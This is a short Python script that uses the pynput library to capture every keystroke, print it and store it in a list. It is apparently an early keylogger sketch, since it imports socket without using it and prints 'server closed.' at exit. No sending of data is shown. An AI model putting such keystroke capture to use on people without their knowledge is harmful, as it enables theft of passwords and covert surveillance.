from socket import socket
from pynput import keyboard

room=[]
flag=True

def on_press(key):
    try:
        print(key.char)
        room.append(key.char)
    except:
        print(key)
        room.append(key)

def main():
        with keyboard.Listener(
            on_press=on_press
        )as listener:
            listener.join()


if __name__== '__main__':
    main()
    print('server closed.')
